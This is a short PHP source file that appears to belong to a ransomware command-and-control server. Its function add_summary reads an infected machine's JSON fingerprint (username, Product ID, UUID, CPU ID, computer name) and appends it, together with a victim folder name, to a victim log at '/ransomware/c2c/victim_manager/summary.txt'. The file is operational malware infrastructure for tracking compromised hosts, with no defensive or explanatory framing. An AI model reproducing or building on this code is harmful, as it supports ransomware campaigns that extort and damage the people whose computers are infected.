<?php

function add_summary($fingerprint, $folder)
{
    $fileh = fopen($fingerprint,'r');
    $fingerprint_read = fread($fileh, filesize($fingerprint));
    $fingerprint_values = json_decode($fingerprint_read);
    fclose($fileh);
    $username= urlencode($fingerprint_values->{'username'});
    $product_id= urlencode($fingerprint_values->{'Product ID'});
    $uuid = urlencode($fingerprint_values->{'UUID'});
    $cpu_id = urlencode($fingerprint_values->{'cpu_id'});
    $computername = urlencode($fingerprint_values->{'computername'});
    $victim_folder = urlencode($folder);

    $data= $username.",".$product_id.",".$uuid.",".$cpu_id.",".$computername.",".$victim_folder."\n";

    #adding to summary.txt
    $summary_file = $_SERVER['DOCUMENT_ROOT'].'/ransomware/c2c/victim_manager/summary.txt';
    $fileh = fopen($summary_file, "a");
    fwrite($fileh, $data);
    fclose($fileh);

}



